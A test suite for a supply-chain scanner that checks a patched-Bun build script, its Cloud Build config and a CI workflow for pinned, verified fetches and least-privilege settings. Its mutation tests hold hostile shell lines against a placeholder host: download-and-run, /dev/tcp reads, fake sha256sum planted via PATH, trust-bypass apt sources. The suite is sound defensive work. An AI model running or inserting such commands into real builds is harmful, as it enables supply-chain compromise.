import { describe, expect, it } from 'bun:test';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { parse } from 'yaml';
import {
  render as renderUnpinned,
  entries as unpinnedEntries,
} from '../infra/bun-base/unpinned.mjs';
import {
  CONSUMED,
  NET_EXACT,
  normalize,
  parseScript,
  scanBuildScript,
  type Unpinned,
} from './helpers/bun-base-scan';

/**
 * #1452 — the patched-Bun build runs least-privilege and fetches nothing unverified that could be
 * pinned. Comment lines are stripped: they explain the design and may name the forbidden forms.
 */
const dir = resolve(import.meta.dirname, '..', 'infra/bun-base');
const code = (f: string) =>
  readFileSync(resolve(dir, f), 'utf8')
    .split('\n')
    .filter((l) => !l.trimStart().startsWith('#'))
    .join('\n');
const build = code('build.sh');
const cloudbuild = code('cloudbuild.yaml');

describe('cloudbuild.yaml runs as the dedicated build SA', () => {
  it('pins serviceAccount to bun-base-build, never the default compute SA', () => {
    expect(cloudbuild).toMatch(
      /^serviceAccount: projects\/gsw-mcp\/serviceAccounts\/bun-base-build@gsw-mcp\.iam\.gserviceaccount\.com$/m,
    );
    expect(cloudbuild).not.toMatch(/compute@developer/);
    expect(cloudbuild).toMatch(/logging: CLOUD_LOGGING_ONLY/);
  });

  it('SBOMs the built artifacts, not only the source tree', () => {
    expect(cloudbuild).toMatch(/scan, dir:\/workspace\/out\b/);
    expect(cloudbuild).toContain('bun-artifacts.cdx.json.sha256');
  });
});

describe('build.sh verifies every pinnable fetch', () => {
  it.each([
    ['apk --allow-untrusted', /--allow-untrusted/],
    ['a script piped into a shell', /\|\s*(ba)?sh\b/],
    ['a key dropped into trusted.gpg.d', /trusted\.gpg\.d/],
  ])('never uses %s', (_n, re) => {
    expect(build).not.toMatch(re);
  });

  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
  it.each([
    ['bootstrap bun zip', 'bun-linux-x64.zip'],
    ['rustup-init', 'rustup-init'],
    ['apk-tools-static', 'apk-tools-static.apk'],
  ])('checks the %s against its in-repo sha256 pin', (_n, file) => {
    expect(pins.filter((l) => l.endsWith(`  ${file}`))).toHaveLength(1);
    expect(pins).toContainEqual(
      expect.stringMatching(new RegExp(`^[0-9a-f]{64}  ${file.replace(/\./g, '\\.')}$`)),
    );
    expect(build).toMatch(
      new RegExp(`(^|\\(cd /tmp && )pin ${file.replace(/\./g, '\\.')}\\)?$`, 'm'),
    );
  });

  it('pins the apt.llvm.org key fingerprint and the LLVM package version', () => {
    expect(build).toMatch(/^LLVM_SIGNER_FPR='(?:[0-9A-F]{4} {1,2}){9}[0-9A-F]{4}'$/m);
    expect(build).toContain('[ "$fpr" = "${LLVM_SIGNER_FPR// /}" ] ||');
    expect(build).toContain('signed-by=/etc/apt/keyrings/apt.llvm.org.gpg');
    for (const pkg of ['clang', 'lld', 'llvm', 'libclang-rt', 'libclang-common']) {
      expect(build).toMatch(new RegExp(`${pkg}-\\$LLVM_MAJOR(-dev)?="\\$LLVM_PKG_VERSION"`));
    }
  });

  it('secret-scan hygiene: no NAME=<32+ hex> assignment in build.sh', () => {
    expect(build).not.toMatch(/^\s*(export\s+)?[A-Za-z_][A-Za-z0-9_]*=['"]?[0-9A-Fa-f]{32,}/m);
  });

  it('verifies Alpine packages against the checked-in keys', () => {
    expect(build).toContain('--keys-dir "$WS/keys/$apkarch"');
    expect(build).toContain('sha256sum -c --strict SHA256SUMS');
    const sums = readFileSync(resolve(dir, 'keys/SHA256SUMS'), 'utf8').trim().split('\n');
    for (const arch of ['x86_64', 'aarch64']) {
      expect(sums.some((l) => new RegExp(`^[0-9a-f]{64}  ${arch}/\\S+\\.rsa\\.pub$`).test(l))).toBe(
        true,
      );
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────
// ALLOWLIST scan (round 5): build.sh and prefix.sh are PARSED with mvdan-sh (the bash parser behind
// shfmt) and the AST is walked — see tests/helpers/bun-base-scan.ts for the nine rules. Rounds 1-4
// used a hand-rolled lexer and every round found a quoting desync that hid a command (#1444 class);
// a real parser removes that class instead of patching the next instance.
//
// LIMITS (also in README.md "Known limits"): the scan reasons about the script's text, not the
// runtime values of variables or the behaviour of the (digest-pinned) image's own tools.
// ─────────────────────────────────────────────────────────────────────────────────────────────

describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly listed', () => {
  const unpinned = unpinnedEntries() as (Unpinned & { why: string; what: string })[];
  const real = readFileSync(resolve(dir, 'build.sh'), 'utf8');
  const prefix = readFileSync(resolve(dir, 'prefix.sh'), 'utf8');
  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
  const scan = (t: string) => scanBuildScript(t, unpinned, pins);
  const scanPrefix = (t: string) => scanBuildScript(t, [], [], { prefix: true });

  it('the real build.sh has no violations', () => {
    expect(scan(real)).toEqual([]);
  });

  it('prefix.sh (the one script build.sh runs with bash) passes the allowlist, with no fetch and no function', () => {
    expect(scanPrefix(prefix)).toEqual([]);
  });

  it('bash -n accepts both scripts (an independent syntax check)', () => {
    for (const f of ['build.sh', 'prefix.sh']) {
      const r = spawnSync('bash', ['-n', resolve(dir, f)], { encoding: 'utf8' });
      expect(r.status, `${f}: ${r.stderr}`).toBe(0);
    }
  });

  it('the walker visits every statement of both scripts', () => {
    for (const t of [real, prefix]) {
      const p = parseScript(t);
      expect(p.total).toBeGreaterThan(20);
      expect(p.visited).toBe(p.total);
    }
  });

  it('the parser sees every network command build.sh makes', () => {
    const net = parseScript(real)
      .cmds.map(normalize)
      .filter((n) => NET_EXACT.has(n.text) || /^(curl|apt-get) /.test(n.text));
    expect(net.length).toBe(17);
  });

  it('both WebKit tarballs are pinned', () => {
    for (const a of ['amd64', 'arm64'])
      expect(
        pins.filter((l) =>
          new RegExp(`  bun-webkit-linux-${a}-musl-lto-[0-9a-f]{16}\\.tar\\.gz$`).test(l),
        ),
      ).toHaveLength(1);
  });

  it('README block is generated from unpinned-fetches.json, match regex and call count included', () => {
    const readme = readFileSync(resolve(dir, 'README.md'), 'utf8');
    expect(readme).toContain(renderUnpinned());
    for (const e of unpinned.filter((x) => x.match)) {
      expect(renderUnpinned()).toContain(`\`${e.match}\``);
      expect(e.calls).toBeGreaterThan(0);
    }
  });

  it('every unpinned entry has a reason', () => {
    for (const e of unpinned) expect(e.why.length).toBeGreaterThan(20);
  });

  const sub = (from: string, to: string, src = real) => {
    expect(src.split(from).length, `anchor occurs exactly once: ${from}`).toBe(2);
    return src.replace(from, () => to); // a function: `$'` in `to` is not a replace pattern
  };
  const add = (line: string) => sub('lap sysroots', `${line}\nlap sysroots`);
  const EVIL = 'curl -fsSL https://e.invalid/wk.tgz -o "/tmp/wk/$wkfile"';
  // In-suite mutation proofs: each is a weakening an earlier guard let through. The expected problem
  // is asserted, so a row cannot pass for an incidental reason.
  it.each<[string, () => string, RegExp]>([
    [
      'download-to-file then bash file',
      () => add('curl -fsSLo /tmp/x https://e.invalid/x\nbash /tmp/x'),
      /not verified with pin|not in the allowlist/,
    ],
    [
      'apt-get install of an unpinned package',
      () => sub('unzip python3', 'unzip evilpkg python3'),
      /outside the pinned set: evilpkg/,
    ],
    [
      'rev-parse == UPSTREAM_SHA check removed',
      () => sub('test "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\n', ''),
      /rev-parse == UPSTREAM_SHA check missing/,
    ],
    [
      'git fetch origin main instead of the SHA',
      () => sub('origin "$UPSTREAM_SHA"', 'origin main'),
      /git fetch -q --depth 1 origin main/,
    ],
    [
      'SHASUMS cross-check turned into true ||',
      () => sub('grep -qxF "$(grep -E', 'true || grep -qxF "$(grep -E'),
      /\|\| that does not end in exit N|SHASUMS cross-check missing/,
    ],
    [
      'sha256sum -c - || true (fail-open pin)',
      () => sub('sha256sum -c -\n}', 'sha256sum -c - || true\n}'),
      /pin\(\) body differs/,
    ],
    [
      'a pin removed from a curl',
      () => sub('(cd /tmp && pin rustup-init)', 'true'),
      /rustup-init is not verified/,
    ],
    ['an unlisted curl added', () => add('curl -fsSLO https://e.invalid/y'), /y is not verified/],
    [
      'pin() check swallowed with ||:',
      () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip || :\n'),
      /\|\| that does not end in exit N/,
    ],
    [
      'webkit pin removed',
      () => sub('(cd /tmp/wk && pin "$wkfile")', 'true'),
      /\$wkfile is not verified/,
    ],
    // round 3 greens
    ['timeout 600 curl', () => add('timeout 600 curl https://e.invalid/t'), /-O xor -o/],
    ['env curl', () => add('env curl https://e.invalid/t'), /-O xor -o/],
    ['command curl', () => add('command curl https://e.invalid/t'), /-O xor -o/],
    [
      'git -C dir fetch origin main',
      () => add('git -C "$SRC" fetch origin main'),
      /not in the allowlist \(head git\)/,
    ],
    ['bun -e fetch', () => add(`bun -e 'fetch("https://e.invalid")'`), /head bun\)/],
    ['bunx pkg', () => add('bunx some-pkg'), /head bunx\)/],
    ['aria2c', () => add('aria2c https://e.invalid/a'), /head aria2c\)/],
    ['go run mod@latest', () => add('go run example.invalid/m@latest'), /head go\)/],
    ['cmake -P', () => add('cmake -P /tmp/x.cmake'), /head cmake\)/],
    [
      'pin() early return 0',
      () => sub('  local line\n', '  return 0\n  local line\n'),
      /pin\(\) body differs/,
    ],
    ['WebKit consumption check deleted', () => sub(`  ${CONSUMED}\n`, ''), /consumed the pinned/],
    [
      'apt-get --allow-unauthenticated',
      () =>
        sub('apt-get install -y -qq curl', 'apt-get install -y -qq --allow-unauthenticated curl'),
      /trust bypass/,
    ],
    [
      'a [trusted=yes] apt source',
      () =>
        add('echo "deb [trusted=yes] http://e.invalid/ x main" >/etc/apt/sources.list.d/x.list'),
      /trust bypass/,
    ],
    ['xargs curl', () => add('echo https://e.invalid | xargs curl -fsSLo /tmp/q'), /fed by xargs/],
    [
      'pinned file used before its pin',
      () => sub('pin bun-linux-x64.zip\n', 'unzip -q bun-linux-x64.zip\npin bun-linux-x64.zip\n'),
      /used before it is pinned/,
    ],
    [
      'pin as an if condition',
      () => sub('pin bun-linux-x64.zip\n', 'if pin bun-linux-x64.zip; then echo ok; fi\n'),
      /only \[ \/ \[\[ \/ test may be an if condition/,
    ],
    [
      'pin before &&',
      () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip && echo ok\n'),
      /a check or fetch before &&/,
    ],
    [
      'loop in an || list',
      () => sub('  lap "build-$arch"\ndone', '  lap "build-$arch"\ndone || echo x'),
      /\|\| that does not end in exit N/,
    ],
    [
      'export of a proxy variable',
      () => add('export https_proxy=http://e.invalid:3128'),
      /unknown variable https_proxy/,
    ],
    [
      'backgrounded fetch',
      () => add('curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z &\npin bun-linux-x64.zip'),
      /backgrounded/,
    ],
    // round 4 greens (review-1469-r4): each was scanned GREEN by the hand-rolled lexer
    [
      "lexer desync: ${x:-'}'} hides a curl",
      () => add(`echo \${x:-'}'}\n${EVIL}\necho \\'`),
      /wk\.tgz|\$wkfile is not verified|-o "\/tmp\/wk\/\$wkfile"/,
    ],
    [
      "lexer desync: $'\\'' hides a curl",
      () => add(`echo $'\\''\n${EVIL}\necho \\'`),
      /\$wkfile is not verified/,
    ],
    [
      'cat </dev/"tcp"/… into the prefetch cache',
      () => add('cat </dev/"tcp"/e.invalid/80 >"$BUN_BUILD_PREFETCH_DIR/by-url/x"'),
      /input redirection from a non-reviewed source/,
    ],
    [
      'name=/dev/tcp; cat <"$name/…"',
      () => add('name=/dev/tcp\ncat <"$name/e.invalid/80" >/tmp/evil'),
      /input redirection from a non-reviewed source/,
    ],
    [
      'verifier shadowing: sha256sum() { … }',
      () => add('sha256sum() { cat >/dev/null; }'),
      /function sha256sum\(\)/,
    ],
    ['verifier shadowing: grep() { … }', () => add('grep() { echo; }'), /function grep\(\)/],
    [
      'PATH prepend plants a fake sha256sum',
      () =>
        add(
          "mkdir /tmp/e\nprintf '#!/bin/sh\\ncat >/dev/null\\n' >/tmp/e/sha256sum\nchmod +x /tmp/e/sha256sum\nexport PATH=/tmp/e:$PATH",
        ),
      /PATH may only be set as/,
    ],
    [
      'ln -sf curl over an allowlisted name',
      () =>
        add('ln -sf /usr/bin/curl /usr/local/bin/file\nfile -fsSLo /tmp/evil https://e.invalid/x'),
      /not in the allowlist \(head ln\)/,
    ],
    ['unclosed (', () => add('( echo x'), /parse error/],
    ['if without fi', () => add('if [ -d /tmp ]; then echo x'), /parse error/],
    ['for without done', () => add('for arch in $TARGETS; do echo x'), /parse error/],
    [
      'tee moved out of the build pipeline',
      () =>
        sub(
          '--build-dir="$bd" 2>&1 | tee "/tmp/build-$arch.log" | tail -n 60',
          '--build-dir="$bd" 2>&1 | tail -n 60\n  tee "/tmp/build-$arch.log" </dev/null',
        ),
      /not tee'd inside the build's own pipeline/,
    ],
    // limits of round 4, now closed
    ['printf -v https_proxy', () => add("printf -v https_proxy '%s' x"), /printf -v/],
    [
      '${X:=…} assignment',
      () => add('echo "${https_proxy:=http://e.invalid}"'),
      /operator other than/,
    ],
    ['export -n PATH', () => add('export -n PATH'), /export -n: only export/],
    [
      'pin in an else branch that never runs',
      () =>
        sub(
          '(cd /tmp && pin rustup-init)\n',
          'if [ -d /tmp ]; then echo skip; else (cd /tmp && pin rustup-init); fi\n',
        ),
      /rustup-init is not verified/,
    ],
    [
      'fetch to one dir, pin a same-named file in another',
      () =>
        sub(
          'curl -fsSLO "$base/bun-linux-x64.zip"',
          'curl -fsSL "$base/bun-linux-x64.zip" -o /tmp/x/bun-linux-x64.zip',
        ),
      /pin bun-linux-x64\.zip runs in \/tmp, but the fetch wrote to \/tmp\/x/,
    ],
    ['a HOME/.gitconfig insteadOf write', () => add('echo x >"$HOME/.gitconfig"'), /trust bypass/],
    ['alias', () => add("alias grep='true'"), /head alias\)/],
    ['hash -p', () => add('hash -p /tmp/evil sha256sum'), /head hash\)/],
    ['enable -n', () => add('enable -n test'), /head enable\)/],
    ['git -c', () => add('git -c http.proxy=x rev-parse HEAD'), /git -c \(config injection\)/],
    ['sudo -s', () => add('sudo -s'), /sudo -s/],
    ['env -S', () => add("env -S 'curl https://e.invalid'"), /env -S/],
    ['(( )) arithmetic command', () => add('(( x = 1 ))'), /ArithmCmd is not modeled/],
    ['while loop', () => add('while false; do :; done'), /WhileClause is not modeled/],
  ])('goes RED on: %s', (_n, mutate, why) => {
    const v = scan(mutate());
    expect(v.join('\n')).toMatch(why);
  });

  it.each<[string, (s: string) => string, RegExp]>([
    [
      'a fake pin() plus a curl in prefix.sh',
      (s) => `${s}\npin() { echo ok; }\ncurl -fsSL https://e.invalid/a -o /tmp/q\npin q`,
      /prefix\.sh defines a function/,
    ],
    [
      'an unpinned curl in prefix.sh',
      (s) => `${s}\ncurl -fsSL https://e.invalid/a -o /tmp/q`,
      /prefix\.sh may not run a network command/,
    ],
  ])('prefix.sh goes RED on: %s', (_n, mutate, why) => {
    expect(scanPrefix(mutate(prefix)).join('\n')).toMatch(why);
  });

  it.each<[string, (e: Unpinned[]) => Unpinned[], RegExp]>([
    [
      'the rustup match widened to also cover a curl',
      (e) =>
        e.map((x) =>
          x.id === 'rustup-toolchain'
            ? { ...x, match: `${x.match}|^curl -fsSL https://e\\.invalid/` }
            : x,
        ),
      /rustup-toolchain matches 4 call\(s\), declared 3/,
    ],
    [
      'the bun-install match widened to ^bun\\b',
      (e) => e.map((x) => (x.id === 'bun-install' ? { ...x, match: '^bun\\b' } : x)),
      /bun-install matches 2 call\(s\), declared 1/,
    ],
  ])('unpinned-fetches.json goes RED on: %s', (_n, mutate, why) => {
    // An extra curl the widened rustup regex would silently swallow.
    const src = add('curl -fsSL https://e.invalid/x -o /tmp/x');
    expect(scanBuildScript(src, unpinned, pins).join('\n')).toMatch(/x is not verified with pin/);
    expect(scanBuildScript(src, mutate(unpinned), pins).join('\n')).toMatch(why);
  });

  it('positive control: a correctly pinned extra fetch stays green', () => {
    expect(
      scan(add('curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z\npin bun-linux-x64.zip')),
    ).toEqual([]);
  });

  it('positive control: a wrapped but correctly pinned fetch stays green', () => {
    expect(
      scan(
        add(
          'timeout 600 curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z\npin bun-linux-x64.zip',
        ),
      ),
    ).toEqual([]);
  });

  it('positive control: `cmd || { echo …; exit 1; }` stays green', () => {
    expect(scan(add('test -d /tmp || { echo "no /tmp" >&2; exit 1; }'))).toEqual([]);
  });
});

describe('bun-base-build.yml: credentialed job triggers and permissions', () => {
  const wfText = readFileSync(
    resolve(dir, '..', '..', '.github/workflows/bun-base-build.yml'),
    'utf8',
  );
  const problems = (t: string): string[] => {
    const doc = parse(t) as {
      on?: unknown;
      permissions?: unknown;
      jobs?: Record<string, { permissions?: unknown }>;
    };
    const out: string[] = [];
    const on = doc.on;
    const triggers = typeof on === 'string' ? [on] : Object.keys((on ?? {}) as object);
    for (const tr of triggers)
      if (!['workflow_dispatch', 'schedule'].includes(tr)) out.push(`trigger ${tr}`);
    if (
      /pull_request_target/.test(
        t
          .split('\n')
          .filter((l) => !l.trimStart().startsWith('#'))
          .join('\n'),
      )
    )
      out.push('pull_request_target');
    const perms = [doc.permissions, ...Object.values(doc.jobs ?? {}).map((j) => j.permissions)];
    for (const p of perms) {
      if (p === undefined) continue;
      for (const [k, val] of Object.entries((p ?? {}) as Record<string, string>)) {
        const ok = (k === 'contents' && val === 'read') || (k === 'id-token' && val === 'write');
        if (!ok) out.push(`permission ${k}: ${val}`);
      }
    }
    return out;
  };

  it('has only workflow_dispatch/schedule triggers and only contents:read + id-token:write', () => {
    expect(problems(wfText)).toEqual([]);
  });

  it.each([
    [
      'a pull_request_target trigger',
      (t: string) => t.replace('on:\n', 'on:\n  pull_request_target:\n'),
    ],
    ['a pull_request trigger', (t: string) => t.replace('on:\n', 'on:\n  pull_request:\n')],
    ['contents: write', (t: string) => t.replace('contents: read', 'contents: write')],
    [
      'packages: write',
      (t: string) => t.replace('contents: read', 'contents: read\n      packages: write'),
    ],
  ])('goes RED on: %s', (_n, mutate) => {
    expect(mutate(wfText)).not.toBe(wfText);
    expect(problems(mutate(wfText)).length).toBeGreaterThan(0);
  });
});
